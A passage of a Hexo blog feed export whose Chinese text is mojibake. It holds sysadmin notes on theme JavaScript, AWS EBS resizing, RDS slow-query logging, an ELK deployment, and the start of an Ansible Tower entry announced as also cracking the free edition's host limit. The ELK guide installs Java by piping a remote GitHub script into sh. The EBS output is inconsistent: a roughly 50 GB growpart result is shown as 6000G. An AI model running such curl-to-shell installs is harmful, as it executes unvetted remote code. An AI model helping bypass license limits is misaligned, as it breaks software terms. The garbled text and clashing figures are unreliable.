&#125;,);function btnPinClick() &#123; var figure = this.parentElement.parentElement; var block = $(figure).attr("block"); if (block != 1) &#123; $(".post-body").css("transform", "none"); $(figure).attr("block", 1); $(this).find("img").attr("src", "/article_images/png/Pin_red.png"); &#125; else &#123; $(figure).attr("block", 0); $(this).find("img").attr("src", "/article_images/png/Pin_green.png"); &#125;&#125;$("figure").unbind("dblclick").bind("dblclick", function () &#123; //ÂèåÂáª‰∫ã‰ª∂ var block = $(this).attr("block"); if (block != 1) &#123; $(".post-body").css("transform", "none"); $(this).attr("block", 1); $(this).find(".codePinBtn img").attr("src", "/article_images/png/Pin_red.png"); &#125; else &#123; $(this).attr("block", 0); $(this).find(".codePinBtn img").attr("src", "/article_images/png/Pin_green.png"); &#125;&#125;)$(window).resize(function () &#123; var block; var width_Main = $("#main").width(); var width_Base = $(".main-inner").width(); var width_Blank = (width_Main - width_Base) / 2 - 10; $copyBtn = $("#copyBtn"); if (width_Blank &lt; $copyBtn.width()) &#123; $copyBtn.css("display", "none"); &#125; else &#123; $copyBtn.css("display", "block"); &#125; $("figure[block='1']").each(function () &#123; block = $(this).attr("block"); if (block == 1) &#123; var width_This = $(this).width(); var width_Scroll = $(this)[0].scrollWidth; var width_Margin = -parseInt($(this).css("marginRight")); var width_Hide = width_Scroll - (width_This - width_Margin); if (width_Hide &gt; 0) &#123; //var width_Main = $("#main").width(); //var width_Base = $(".main-inner").width(); //width_Blank = (width_Main - width_Base) / 2 - 10; if (width_Blank &gt; 0) &#123; if (width_Hide &lt; width_Blank) &#123; width_Margin = width_Hide; //Á©∫ÁôΩÂå∫ÂüüË∂≥Â§üÁõ¥Êé•ÊòæÁ§∫ ÂÖ®ÈÉ® &#125; else &#123; width_Margin = width_Blank * 0.8; &#125; $(this).css(&#123; marginRight: -width_Margin &#125;); $(this).find(".codePinBtn").animate(&#123; opacity: 1, left: $(".post-body")[0].getBoundingClientRect().right + width_Margin - $(this).find(".codePinBtn").width() &#125;); &#125; &#125; &#125; &#125;);&#125;);$(document).ready(function () &#123; createCopyBtns(); $(".codePinBtn").unbind("click").bind("click", btnPinClick);&#125;); 0x02 Ê∑ªÂä†Ëá™Âä®ÊîπÂèò‰ª£Á†ÅÁâáÊÆµjs ./themes/next/source/js/src/function.js Êñ∞Â¢û ./themes/next/source/js/src/function.js1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980function getClass(tagName, className) //Ëé∑ÂæóÊ†áÁ≠æÂêç‰∏∫tagName,Á±ªÂêçclassNameÁöÑÂÖÉÁ¥†&#123; if (document.getElementsByClassName) //ÊîØÊåÅËøô‰∏™ÂáΩÊï∞ &#123; return document.getElementsByClassName(className); &#125; else &#123; var tags = document.getElementsByTagName(tagName); //Ëé∑ÂèñÊ†áÁ≠æ var tagArr = []; //Áî®‰∫éËøîÂõûÁ±ªÂêç‰∏∫classNameÁöÑÂÖÉÁ¥† for (var i = 0; i &lt; tags.length; i++) &#123; if (tags[i].class == className) &#123; tagArr[tagArr.length] = tags[i]; //‰øùÂ≠òÊª°Ë∂≥Êù°‰ª∂ÁöÑÂÖÉÁ¥† &#125; &#125; return tagArr; &#125;&#125;function addEvent(obj, type, fn) &#123; if (obj.addEventListener) obj.addEventListener(type, fn, false); else if (obj.attachEvent) obj.attachEvent('on' + type, fn); else obj['on' + type] = fn;&#125;function removeEvent(obj, type, fn) &#123; if (obj.removeEventListener) obj.removeEventListener(type, fn, false); else if (obj.detachEvent) obj.detachEvent('on' + type, fn); else obj['on' + type] = null;&#125;;function resizePos(obj, callback) &#123; if (typeof callback == "function") &#123; addEvent(window, 'scroll', function() &#123; callback(obj); &#125;); addEvent(window, 'resize', function() &#123; callback(obj); &#125;); &#125;&#125;function getBrowser(getVersion) &#123; //Ê≥®ÊÑèÂÖ≥ÈîÆÂ≠óÂ§ßÂ∞èÂÜô var ua_str = navigator.userAgent.toLowerCase(), ie_Tridents, trident, match_str, ie_aer_rv, browser_chi_Type; //Âà§Êñ≠IE ÊµèËßàÂô®, //blog: http://blog.csdn.Net/aerchi/article/details/51697592 if ("ActiveXObject" in self) &#123; // ie_aer_rv: ÊåáÁ§∫IE ÁöÑÁâàÊú¨. // It can be affected by the current document mode of IE. ie_aer_rv = (match_str = ua_str.match(/msie ([\d.]+)/)) ? match_str[1] : (match_str = ua_str.match(/rv:([\d.]+)/)) ? match_str[1] : 0; // ie: Indicate the really version of current IE browser. ie_Tridents = &#123; "trident/7.0": 11, "trident/6.0": 10, "trident/5.0": 9, "trident/4.0": 8 &#125;; //ÂåπÈÖç ie8, ie11, edge trident = (match_str = ua_str.match(/(trident\/[\d.]+|edge\/[\d.]+)/)) ? match_str[1] : undefined; browser_chi_Type = (ie_Tridents[trident] || ie_aer_rv) &gt; 0 ? "internet-explorer" : undefined; &#125; else &#123; //Âà§Êñ≠ windows edge ÊµèËßàÂô® // match_str[1]: ËøîÂõûÊµèËßàÂô®ÂèäÁâàÊú¨Âè∑,Â¶Ç: "edge/13.10586" // match_str[1]: ËøîÂõûÁâàÊú¨Âè∑,Â¶Ç: "edge" //Ëã•Ë¶ÅËøîÂõû "edge" ËØ∑Êää‰∏ãË°åÁöÑ "ie" Êç¢Êàê "edge"„ÄÇ Ê≥®ÊÑèÂºïÂè∑ÂèäÂÜíÂè∑ÊòØËã±ÊñáÁä∂ÊÄÅ‰∏ãËæìÂÖ•ÁöÑ browser_chi_Type = (match_str = ua_str.match(/edge\/([\d.]+)/)) ? "edge" : //Âà§Êñ≠firefox ÊµèËßàÂô® (match_str = ua_str.match(/firefox\/([\d.]+)/)) ? "firefox" : //Âà§Êñ≠chrome ÊµèËßàÂô® (match_str = ua_str.match(/chrome\/([\d.]+)/)) ? "chrome" : //Âà§Êñ≠opera ÊµèËßàÂô® (match_str = ua_str.match(/opera.([\d.]+)/)) ? "opera" : //Âà§Êñ≠safari ÊµèËßàÂô® (match_str = ua_str.match(/version\/([\d.]+).*safari/)) ? "safari" : undefined; &#125; //ËøîÂõûÊµèËßàÂô®Á±ªÂûãÂíåÁâàÊú¨Âè∑ var verNum, verStr; verNum = trident &amp;&amp; ie_Tridents[trident] ? ie_Tridents[trident] : match_str[1]; verStr = (getVersion != undefined) ? browser_chi_Type + "/" + verNum : browser_chi_Type; return verStr;&#125; 0x03 ÊèíÂÖ•Âà∞‰∏ªÈ¢òÊñ∞Âª∫Êñá‰ª∂ custom.swig ÔºåÁõÆÂΩïÂ¶Ç‰∏ãÔºöÔºàÁõ∏ÂØπÁõÆÂΩï‰∏∫Â∑•Á®ãÁõÆÂΩïÔºâ ./themes/next/layout_custom/custom.swig Êñ∞Â¢û 123&lt;script type="text/javascript" src="/js/src/function.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="/lib/zclip/clipboard.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="/js/src/custom.js"&gt;&lt;/script&gt; ‰øÆÊîπÊñá‰ª∂ _layout.swig ÔºåÁõÆÂΩïÂ¶Ç‰∏ãÔºöÔºàÁõ∏ÂØπÁõÆÂΩï‰∏∫Â∑•Á®ãÁõÆÂΩïÔºâ ./themes/next/layout/_layout.swig ‰øÆÊîπ ./themes/next/layout/_layout.swig&lt;!doctype html&gt;...&lt;html class="&#123;&#123; html_class | lower &#125;&#125;" lang="&#123;&#123; config.language &#125;&#125;"&gt;&lt;head&gt;...&lt;/head&gt;&lt;body itemscope itemtype="http://schema.org/WebPage" lang="&#123;&#123; page.lang || page.language || config.language &#125;&#125;"&gt; ... ... &#123;% include '_third-party/mathjax.swig' %&#125; &#123;% include '_third-party/scroll-cookie.swig' %&#125; &#123;% include '_third-party/exturl.swig' %&#125; &#123;% include '_custom/custom.swig' %&#125;&lt;/body&gt;&lt;/html&gt; 0x04 Êõ¥Êîπbutton ./themes/next/source/css/_custom/button.styl Êñ∞Â¢û 1234567891011121314151617.codePinBtn&#123; flex: 0 0 auto; opacity: 0; z-index: 1000; margin-left: -23px; align-self: start;&#125;#copyBtn &#123; opacity: 0; position: fixed; display: block; z-index: 1000; line-height: 1; font-size: 1.5em; left: 18px;&#125; ./themes/next/source/css/_custom/custom.styl ‰øÆÊîπ ...@import button; Ê∑ªÂä†‰ª£Á†ÅÊãâ‰º∏ÊéßÂà∂buttonÊñá‰ª∂ Ââ©‰∏ãÁöÑËá™Â∑±ÈºìÊç£ Á•ûÂô®]]></content>
      <categories>
        <category>Note</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Next</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AWS EC2 Á£ÅÁõòEBSÊâ©ÂÆπ]]></title>
    <url>%2F2017%2F11%2F15%2Flinux-aws-ebs%2F</url>
    <content type="text"><![CDATA[5min‰∏çÂÅúÊú∫Êâ©ÂÆπEBSÂç∑Â§ßÂ∞è 0x00 Â¢ûÂä†Á£ÅÁõòÂ§ßÂ∞è1. Âú®ec2ÂÆû‰æãÁïåÈù¢ÈÄâÊã©Áõ∏Â∫îÈúÄË¶ÅÊâ©ÂÆπÁ£ÅÁõòÁöÑÂÆû‰æãÔºåÈÄâÊã©Ë¶ÅÊâ©ÂÆπÁöÑÁ£ÅÁõò 2. ‰øÆÊîπÂç∑Â§ßÂ∞è 3. Á°ÆËÆ§ÊòæÁ§∫ËøõÂ∫¶ÔºåÁ≠âÂæÖÂ∫îÁî®ÈÖçÁΩÆÂÆåÊàêÔºåÈúÄË¶ÅÂá†ÂàÜÈíüËÄêÂøÉÁ≠âÂæÖ‚Ä¶. 0x01 Êâ©ÂÆπÁ£ÅÁõòÂÆâË£ÖÊâ©ÂÆπÂ∑•ÂÖ∑ 1yum install cloud-init cloud-utils-growpart gdisk Á≠âÂæÖebsÂç∑Â§ßÂ∞èË∞ÉÊï¥ÂÆåÊàêÂêéÔºåÂú®Êâ©ÂÆπÁöÑÂÆû‰æã‰∏≠ÊâßË°ålsblkÂàóÂá∫ËøûÊé•Âà∞ÂÆû‰æãÁöÑEBSËÆæÂ§á 1234[root@ttt] #: lsblkNAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTxvda 202:0 0 6000G 0 disk ‚îî‚îÄxvda1 202:1 0 20G 0 part / ‰ΩøÁî® df -h Êü•ÁúãÔºå/dev/xvda1 ËÆæÂ§áÂ∑≤Êâ©Â±ï‰∏∫ 6000 GiBÔºå‰ΩÜÊìç‰ΩúÁ≥ªÁªü‰ªçÂè™ËÉΩÁúãÂà∞ÂéüÊù•ÁöÑ 20 GiB ext4 Êñá‰ª∂Á≥ªÁªü 12345[root@ttt] #: df -hÊñá‰ª∂Á≥ªÁªü ÂÆπÈáè Â∑≤Áî® ÂèØÁî® Â∑≤Áî®% ÊåÇËΩΩÁÇπdevtmpfs 3.9G 64K 3.9G 1% /devtmpfs 3.9G 0 3.9G 0% /dev/shm/dev/xvda1 20G 12G 8.2G 59% / Êé•‰∏ãÊù•‰ΩøÁî®growpartÂ±ïÂºÄ‰øÆÊîπÂêéÁöÑÂàÜÂå∫ÔºàÊ≥®ÊÑèÂ∞ÜËÆæÂ§áÂêçÁß∞‰∏éÂàÜÂå∫ÂêçÁß∞ÂàÜÈöîÂºÄÔºâ 12[root@ttt] #: growpart /dev/xvda 1CHANGED: disk=/dev/xvda partition=1: start=4096 old: size=41938910,end=41943006 new: size=104853470,end=104857566 ÈÄöËøáÊü•ÁúãlsblkÂèØ‰ª•Á°ÆËÆ§ÂàÜÂå∫/dev/xvda1Áé∞Â∑≤Â°´ÂÖÖÂç∑/dev/xvda‰∏äÁöÑÂèØÁî®Á©∫Èó¥Ôºö 1234[root@ttt] #: lsblkNAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTxvda 202:0 0 6000G 0 disk ‚îî‚îÄxvda1 202:1 0 6000G 0 part / ÂØπ‰∫é Linux ext2„ÄÅext3 Êàñ ext4 Êñá‰ª∂Á≥ªÁªüÔºå‰ΩøÁî®‰ª•‰∏ãÂëΩ‰ª§Âπ∂ÊõøÊç¢Ë¶ÅÊâ©Â±ïÁöÑËÆæÂ§áÂêçÁß∞Ôºö 12345[root@ttt] #: resize2fs /dev/xvda1resize2fs 1.42.12 (29-Aug-2014)Filesystem at /dev/xvda1 is mounted on /; on-line resizing requiredold_desc_blocks = 2, new_desc_blocks = 4The filesystem on /dev/xvda1 is now 13106683 (4k) blocks long. 0x02 ÂÆåÊàêÊâ©ÂÆπËá≥Ê≠§ÔºåÁ£ÅÁõòÂ∑≤ÂÆåÊàêÊâ©ÂÆπÔºåÊü•ÁúãÁ£ÅÁõòÂèØÁî®Á©∫Èó¥Ôºö 12345[root@ttt] #: df -hÊñá‰ª∂Á≥ªÁªü ÂÆπÈáè Â∑≤Áî® ÂèØÁî® Â∑≤Áî®% ÊåÇËΩΩÁÇπdevtmpfs 3.9G 64K 3.9G 1% /devtmpfs 3.9G 0 3.9G 0% /dev/shm/dev/xvda1 6000G 12G 5988.2G 0.002% /]]></content>
      <categories>
        <category>Ëá™Âä®ÂåñËøêÁª¥</category>
        <category>AWS</category>
      </categories>
      <tags>
        <tag>AWS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[aws‰∏äRDSÊï∞ÊçÆÂ∫ìÂºÄÂêØÊÖ¢Êü•ËØ¢Êó•Âøó]]></title>
    <url>%2F2017%2F11%2F08%2Fmysql-slowlog%2F</url>
    <content type="text"><![CDATA[mysqlÊï∞ÊçÆÂ∫ìÂºÄÂêØÊÖ¢Êü•ËØ¢Êó•ÂøóÂíåÊü•ËØ¢‰∏≠Ê≤°Á¥¢ÂºïÁöÑËØ≠Âè•„ÄÇ‰æõÂàÜÊûê 0x00ÂèÇÊï∞È¶ñÂÖàÈÄâÊã©RDSÊúçÂä°&gt;ÂèÇÊï∞ÁªÑÈÄâÊã©ÈúÄË¶ÅÊõ¥ÊîπÁöÑÂèÇÊï∞ÁªÑÊõ¥ÊîπÂ¶Ç‰∏ãÂèÇÊï∞: 123456789101112- slow_query_logÔºöË¶ÅÂàõÂª∫ÊÖ¢ÈÄüÊü•ËØ¢Êó•ÂøóÔºåËØ∑ËÆæÁΩÆ‰∏∫ 1„ÄÇÈªòËÆ§ÂÄº‰∏∫ 0„ÄÇ- general_logÔºöË¶ÅÂàõÂª∫‰∏ÄËà¨Êó•ÂøóÔºåËØ∑ËÆæÁΩÆ‰∏∫ 1„ÄÇÈªòËÆ§ÂÄº‰∏∫ 0„ÄÇ- long_query_timeÔºöÂè™ËÆ∞ÂΩïÊü•ËØ¢Êó∂Èó¥Ë∂ÖËøáÂà∂ÂÆöÊó∂Èó¥ÁöÑsql„ÄÇ‰æãlong_query_time=0.5Âè™ËÆ∞ÂΩïÊü•ËØ¢Êó∂Èó¥Ë∂ÖËøá500ÊØ´ÁßíÁöÑsql„ÄÇ- log_queries_not_using_indexesÔºöË¶ÅÂ∞ÜÊâÄÊúâ‰∏ç‰ΩøÁî®Á¥¢ÂºïÁöÑÊü•ËØ¢ËÆ∞ÂΩïÂà∞ÊÖ¢ÈÄüÊü•ËØ¢Êó•ÂøóÔºåËØ∑ËÆæÁΩÆ‰∏∫ 1„ÄÇÈªòËÆ§ÂÄº‰∏∫ 0„ÄÇÂç≥‰ΩøÊü•ËØ¢ÁöÑÊâßË°åÊó∂Èó¥Â∞è‰∫é long_query_time ÂèÇÊï∞ÂÄºÔºåÂè™Ë¶ÅÂÆÉ‰ª¨‰∏ç‰ΩøÁî®Á¥¢ÂºïÔºåÂ∞±‰ºöË¢´Á≥ªÁªüËÆ∞ÂΩï„ÄÇ- log_outputÔºöÊÇ®ÂèØ‰∏∫ log_output ÂèÇÊï∞ÊåáÂÆö‰∏ãÂàóÈÄâÈ°π‰πã‰∏Ä„ÄÇ TABLE (ÈªòËÆ§) ‚Äì Â∞Ü‰∏ÄËà¨Êü•ËØ¢ÂÜôÂÖ• mysql.general_log Ë°®ÔºåÂ∞ÜÊÖ¢ÈÄüÊü•ËØ¢ÂÜôÂÖ• mysql.slow_log Ë°®„ÄÇ FILE (Êé®Ëçê) ‚Äì Â∞Ü‰∏ÄËà¨Êü•ËØ¢Êó•ÂøóÂíåÊÖ¢ÈÄüÊü•ËØ¢Êó•ÂøóÂÜôÂÖ•Êñá‰ª∂Á≥ªÁªü„ÄÇÊó•ÂøóÊñá‰ª∂ÊØèÂ∞èÊó∂ËΩÆÊç¢‰∏ÄÊ¨°„ÄÇ NONE‚Äì Á¶ÅÁî®Êó•ÂøóËÆ∞ÂΩï„ÄÇ ÂêØÁî®‰∫ÜÊó•ÂøóËÆ∞ÂΩïÊó∂ÔºåAmazon RDS ‰ºöÂÆöÊúüËΩÆÊç¢Ë°®Êó•ÂøóÊàñÂà†Èô§Êó•ÂøóÊñá‰ª∂Ôºålog_output‰∏∫TABLEÊó∂Â¶ÇÈúÄÊâãÂä®ËΩÆÊç¢ÊâßË°åÔºö 12PROMPT&gt; CALL mysql.rds_rotate_slow_log;PROMPT&gt; CALL mysql.rds_rotate_general_log; log_output‰∏∫FILEÊó∂‰ºöÊØèÂ∞èÊó∂Ê£ÄÊü•Êó•ÂøóÊñá‰ª∂Âπ∂Âà†Èô§ 24 Â∞èÊó∂‰πãÂâçÁöÑÊó•ÂøóÊñá‰ª∂„ÄÇ 0x01ÂÆûÈôÖÂ∫îÁî®ÂèÇÊï∞12345slow_query_log=1general_log=1long_query_time=0.5log_queries_not_using_indexes=1log_output=FILE]]></content>
      <categories>
        <category>Êï∞ÊçÆÂ∫ì</category>
        <category>Mysql</category>
      </categories>
      <tags>
        <tag>AWS</tag>
        <tag>Mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[log4j-1.2 + ELKÈÉ®ÁΩ≤]]></title>
    <url>%2F2017%2F09%2F18%2Felk-deploy%2F</url>
    <content type="text"><![CDATA[log4j-1.2 + logstash-5.0.1 + elasticsearch-5.6.0 + kibana-5.6.0 0x00 ‰∏ãËΩΩELK‰∏ãËΩΩ Ôºö 1) logstash-5.0.12) kibana-5.6.03) elasticsearch-5.6.04) ÂÆâË£Öjdk1.8 curl https://raw.githubusercontent.com/kalivim/Linux_shell/master/jdk-1.8.112.sh|sh ‰∏ãËΩΩÂÆåÊàêÂêéËß£ÂéãÁõ∏Â∫îÊñá‰ª∂,ËÑöÊú¨ÂÆâË£ÖjdkÂú®/data/software/‰∏ã 123export JAVA_HOME=/data/jdk1.8.0_112export PATH=$JAVA_HOME/bin:$PATHexport CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar 0x01 ÈÖçÁΩÆlog4jÈ¶ñÂÖàÈÖçÁΩÆÁ®ãÂ∫èlog4jÈÖçÁΩÆÊñá‰ª∂log4j.properties,Ê∑ªÂä†Â¶Ç‰∏ãÈÖçÁΩÆ 1234567891011#Âú®rootLogger‰∏≠Ê∑ªÂä†logstashlog4j.rootLogger=info,all,logstash#logstachlog4j.appender.logstash=org.apache.log4j.net.SocketAppender#logstashÁõëÂê¨Á´ØÂè£ÔºåÈªòËÆ§4560log4j.appender.logstash.Port=4560#logstash‰∏ªÊú∫ip/hostlog4j.appender.logstash.RemoteHost=opslog4j.appender.logstash.ReconnectionDelay=60000log4j.appender.logstash.LocationInfo=true 0x02 ÈÖçÁΩÆlogstashÁºñËæëÈÖçÁΩÆÊñá‰ª∂Ôºålog4j.cfg 12345678910111213141516171819202122232425262728293031323334353637vim logstash-5.0.1/log4j.cfg#ÂÜÖÂÆπinput &#123; log4j &#123; host =&gt; &quot;172.16.0.12&quot; #ÁõëÂê¨Âú∞ÂùÄ port =&gt; 4560 #ÁõëÂê¨Á´ØÂè£ &#125;&#125;filter &#123; #ËøáÊª§ÈîôËØØÁ±ªÂûãÂà†Èô§ÊéâINFOÁ±ªÂûãÈîôËØØ if [priority] == &quot;INFO&quot; &#123; drop &#123;&#125; &#125; #else if [method] == &quot;checkSqlShardName&quot; &#123; #drop &#123;&#125; #&#125;&#125;output &#123; #ËæìÂá∫Âà∞ÊéßÂà∂Âè∞ÔºàË∞ÉËØïÔºâ stdout &#123; codec =&gt; rubydebug &#125; elasticsearch &#123; hosts =&gt; [&quot;127.0.0.1:9200&quot;] #elasticsearchÂú∞ÂùÄ index =&gt; &quot;game-%&#123;+YYYY.MM.dd&#125;&quot; #Âª∫Á´ãÁ¥¢Âºï flush_size =&gt; 1000 &#125;&#125; Ê≥®ÊÑèËøôÈáåÊúâ‰∏Ä‰∏™Â∞èbug,Âú®input‰∏≠‰ΩøÁî®log4jÊé•Êî∂‰∏çÂà∞Êó•ÂøóÔºå‰ΩøÁî®tcpÂèØ‰ª•Êé•Êî∂„ÄÇËøôÈáåÈúÄË¶ÅÊîπ‰∏ãlogstashÊ∫êÁ†ÅÊñá‰ª∂ vim logstash-core/lib/jars.rb Ê≥®ÈáäÊéâÁ¨¨‰∫åË°å#require_jar(&#39;org.apache.logging.log4j&#39;, &#39;log4j-1.2-api&#39;, &#39;2.6.2&#39;) Ê≥® ÔºöÂèØ‰ª•Êääoutput‰∏≠ÁöÑelasticsearchÔºåÊ≥®ÈáäÊéâÔºåÂêØÂä®javaÁ®ãÂ∫èÊµãËØï‰∏ãlogstashÊéßÂà∂Âè∞‰∏≠ÊòØÂê¶ËæìÂá∫Êó•ÂøóÔºåË∞ÉËØïÂêØÂä®./bin/logstash -f log4j.cfg 0x03 ÈÖçÁΩÆelasticsearchrootÁõ¥Êé•ÂêØÂä® elasticsearch Êä•ÈîôÂ¶Ç‰∏ã 123456789101112131415[2017-09-18T08:51:35,959][WARN ][o.e.b.ElasticsearchUncaughtExceptionHandler] [] uncaught exception in thread [main]org.elasticsearch.bootstrap.StartupException: java.lang.RuntimeException: can not run elasticsearch as root at org.elasticsearch.bootstrap.Elasticsearch.init(Elasticsearch.java:136) ~[elasticsearch-5.6.0.jar:5.6.0] at org.elasticsearch.bootstrap.Elasticsearch.execute(Elasticsearch.java:123) ~[elasticsearch-5.6.0.jar:5.6.0] at org.elasticsearch.cli.EnvironmentAwareCommand.execute(EnvironmentAwareCommand.java:67) ~[elasticsearch-5.6.0.jar:5.6.0] at org.elasticsearch.cli.Command.mainWithoutErrorHandling(Command.java:134) ~[elasticsearch-5.6.0.jar:5.6.0] at org.elasticsearch.cli.Command.main(Command.java:90) ~[elasticsearch-5.6.0.jar:5.6.0] at org.elasticsearch.bootstrap.Elasticsearch.main(Elasticsearch.java:91) ~[elasticsearch-5.6.0.jar:5.6.0] at org.elasticsearch.bootstrap.Elasticsearch.main(Elasticsearch.java:84) ~[elasticsearch-5.6.0.jar:5.6.0]Caused by: java.lang.RuntimeException: can not run elasticsearch as root at org.elasticsearch.bootstrap.Bootstrap.initializeNatives(Bootstrap.java:106) ~[elasticsearch-5.6.0.jar:5.6.0] at org.elasticsearch.bootstrap.Bootstrap.setup(Bootstrap.java:195) ~[elasticsearch-5.6.0.jar:5.6.0] at org.elasticsearch.bootstrap.Bootstrap.init(Bootstrap.java:342) ~[elasticsearch-5.6.0.jar:5.6.0] at org.elasticsearch.bootstrap.Elasticsearch.init(Elasticsearch.java:132) ~[elasticsearch-5.6.0.jar:5.6.0] ... 6 more elasticsearch‰∏çÂÖÅËÆ∏rootÁî®Êà∑ËøêË°åÔºåÈ¶ñÂÖàÂàõÂª∫ÊôÆÈÄöÁî®Êà∑ÔºåËÆæÁΩÆÊùÉÈôê 123useradd elkchown -R elk:elk ./elasticsearch-5.6.0 ÈÖçÁΩÆÊñá‰ª∂config/elasticsearch.ymlÁ¨¨55Ë°åÂíå59Ë°åÊòØÁõëÂê¨Âú∞ÂùÄÂíåÁ´ØÂè£Ôºåconfig/jvm.optionsjvmÂÜÖÂ≠òÈÖçÁΩÆÊñá‰ª∂ÔºåÊ†πÊçÆÈúÄÊ±ÇÈÖçÁΩÆ ÂàáÊç¢Âà∞ÊôÆÈÄöÁî®Êà∑elkÂêØÂä®elasticsearch 1234su - elkcd /data/elk/elasticsearch-5.6.0./bin/elasticsearch -d#-dÈÄâÈ°πÂêéÂè∞ËøêË°å 0x04 ÈÖçÁΩÆnginxÂä†Âõ∫kibanaÂÆâÂÖ®1234567891011121314151617181920server &#123; listen 8000; server_name localhost; auth_basic &quot;ELK Log Auth&quot;; #ÂØÜÁ†ÅÊñá‰ª∂ auth_basic_user_file /data/nginx/kibana.passwd; #ÈÖçÁΩÆssl ssl on; ssl_certificate /data/nginx/all.crt; ssl_certificate_key /data/nginx/server.key; location / &#123; proxy_pass http://127.0.0.1:5601; proxy_redirect off; &#125;&#125; 1. ÁîüÊàênginxËÆ§ËØÅÊñá‰ª∂Â¶ÇÊûúÊèêÁ§∫Ê≤°Áî®htpasswdÂ∞±Ë£Ö‰∏™apache,Ê†πÊçÆÊèêÁ§∫ËæìÂÖ•‰∏§Ê¨°ÂØÜÁ†ÅÂ∞±ok 1234htpasswd -c /data/nginx/kibana.passwd username#&gt; New password: #&gt; Re-type new password: #&gt; Adding password for user username 2. ÁîüÊàêsslËØÅ‰π¶12345openssl genrsa -des3 -out server.key 1024openssl rsa -in server.key -out server1.keyopenssl req -new -key server1.key -out all.csr#‰ºöÊèêÁ§∫ËÆ©ËæìÂÖ•ÂêÑÁßç‰ø°ÊÅØÔºåÊúÄÂêé‰ºöËÆ©ËæìÂÖ•ÂØÜÁ†ÅÔºåÂ¶ÇÊûúËÆæÁΩÆÂêØÂä®nginx‰ºöËÆ©ËæìÂÖ•ÂØÜÁ†Å„ÄÇopenssl x509 -req -days 365 -in all.csr -signkey server1.key -out all.crt 3. ÂêØÂä®nginx1./sbin/nginx 0x05 ÂêØÂä®elk‰ΩøÁî®screen ÂêØÂä®kibana„ÄÅlogstash ÂêØÂä®logstashÔºö 1234567891011121314151617#ÂàõÂª∫Âêç‰∏∫logstashÁöÑscreenÂêéÂè∞ËøõÁ®ãscreen -dmS logstash#Êü•ÁúãscreenËøõÁ®ãscreen -lsThere are screens on: 19654.logstash (Detached)#ËøõÂÖ•‰ºöËØùscreen -r logstash#ÂêØÂä®logstashcd /data/elk/logstash-5.0.1./bin/logstash -f log4j.cfg#ÂêéÂè∞ËøêË°åCtrl + a d ÂêØÂä®kibanaÔºö 12345screen -dmS kibanascreen -r kibanacd /data/elk/kibana-5.6.0-linux-x86_64./bin/kibanaCtrl + a + d kibanaÊ∑ªÂä†Á¥¢Âºïgame-ÔºàÂú®logstashÈÖçÁΩÆÊñá‰ª∂‰∏≠Ôºâ Ëá™ÂÆö‰πâVisualizeÔºåÊòæÁ§∫Âà∞dashboard 0x06 ËøôÂè™ÊòØÂºÄÂßã„ÄÇ„ÄÇ„ÄÇ„ÄÇËøõÈó®Êë∏Áà¨ÊªöÊâì]]></content>
      <categories>
        <category>Ëá™Âä®ÂåñËøêÁª¥</category>
        <category>ELK</category>
      </categories>
      <tags>
        <tag>ELK</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ansible-TowerÈÉ®ÁΩ≤andÁ†¥Ëß£]]></title>
    <url>%2F2017%2F07%2F24%2Flinux-tower%2F</url>
    <content type="text"><![CDATA[ansibke-tower‰ªñÊòØ‰∏Ä‰∏™ÂõæÂΩ¢ÂåñÁöÑ‰ªªÂä°Ë∞ÉÂ∫¶ÔºåÂ§çÊùÇÊúçÂä°ÈÉ®ÁΩ≤ÔºåITËá™Âä®ÂåñÁöÑ‰∏Ä‰∏™ÁÆ°ÁêÜÂπ≥Âè∞„ÄÇÂèØ‰ª•ÈÄöËøáÁïåÈù¢‰ªégithubÊãâÂèñÊúÄÊñ∞playbookÂÆûÊñΩÊúçÂä°ÈÉ®ÁΩ≤ÔºåÊèêÈ´òÁîü‰∫ßÊïàÁéá„ÄÇÂΩìÁÑ∂ÔºåÂÆÉ‰πüÊèê‰æõ‰∏Ä‰∏™RESET APIÂíåÂëΩ‰ª§Ë°åÁöÑCLI‰ª•‰æõpythonËÑöÊú¨Ë∞ÉÁî®„ÄÇ 0x00 ÂâçË®Äansible-towerÂÖ≥‰∫éÊ≠§Á±ªÁöÑÊñáÁ´†ÊØîËæÉÂ∞ëÔºåË∏©ËøáÂùëÔºå16Âπ¥ÈÇ£‰ºöÂÑøÊúâÂê¨ËøáÂ∞±Ë£Ö‰∏äÁ†îÁ©∂‰∫Ü‰∏ÄÂèëÔºåÁé∞Âú®ÂÅö‰∏™ËøüÊù•ÁöÑÁ¨îËÆ∞Ôºå ÂåÖÊã¨ÈÉ®ÁΩ≤ÔºåÂíåÂÖçË¥πÁâà10Âè∞Êú∫Âô®ÈôêÂà∂ÁöÑÁ†¥Ëß£„ÄÇ ÊîØÊåÅÁöÑÊìç‰ΩúÁ≥ªÁªüÔºö Red Hat Enterprise Linux 7.2 or later 64-bit CentOS 7.2 or later 64-bit Ubuntu 14.04 LTS 64-bit Ubuntu 16.04 LTS 64-bit Êé®ËçêÊúÄ‰ΩéÂÜÖÂ≠ò‰∏∫2GB„ÄÇ 0x01 ÂÆâË£ÖÊï¥‰∏™Áî≥ËØ∑ÊµÅÁ®ã‰πüÊòØÈ∫ªÁÉ¶ÁöÑÂæàÔºåÂ∞§ÂÖ∂ÊòØÁî≥ËØ∑ÂÖçË¥πlicense„ÄÇËøôÈáåÁõ¥Êé•ÁªôÂá∫ÂÆòÁΩë‰∏ãËΩΩÈìæÊé•Ansible-Tower ËøôÈáå‰ΩøÁî®ÁöÑÊòØÊúÄÊñ∞Áâà(3.1.4) 1234567wget http://releases.ansible.com/ansible-tower/setup/ansible-tower-setup-latest.tar.gz -P /data/tower/cd /data/tower/tar xvf ansible-tower-setup-latest.tar.gz -C ./cd ansible-tower-setup-3.1.4/ 